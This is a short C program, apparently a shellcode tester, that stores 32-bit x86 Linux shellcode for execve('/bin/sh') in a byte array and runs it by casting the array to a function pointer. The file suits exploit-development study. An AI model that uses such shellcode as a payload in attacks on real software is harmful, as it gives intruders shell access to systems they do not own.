#include <stdio.h>
#include <string.h>


int main() {
    //shellcode executes execve(/bin/sh);
    char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x08\x04\x03\xcd\x80";
	(*(void (*)()) shellcode)(); //Executes code from shellcode[]

	printf("\nExited normally.\n");
	return 0;
}
